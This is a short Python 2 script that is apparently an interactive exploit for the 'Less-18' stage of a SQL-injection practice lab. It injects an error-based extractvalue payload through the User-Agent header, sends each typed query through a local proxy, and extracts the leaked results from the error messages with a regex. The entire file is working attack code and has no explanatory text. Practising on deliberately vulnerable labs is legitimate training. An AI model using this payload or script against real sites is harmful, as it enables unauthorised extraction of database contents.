#-*- coding: UTF-8 -*-
import requests
import string
import re


org_url = "http://mysqlilabs.com/Less-18/"
proxies = {"http":"http://127.0.0.1:8080"}
data = {"uname":"admin","passwd":"0","submit":"Submit"}
user_agent = "123' and extractvalue(1,concat(0x7e,(%s),0x7e)) and '1'='1"

if __name__ == "__main__":
	while True:
		query = raw_input("> ")
		#query.replace(' ','+')

		headers = {'User-Agent':user_agent%query}

		try:
			r = requests.post(url = org_url,data=data,headers = headers,proxies=proxies)
			match = re.findall(r'~(.*)~',r.content)
			for m in match:
				print m
		except Exception, e:
			print e

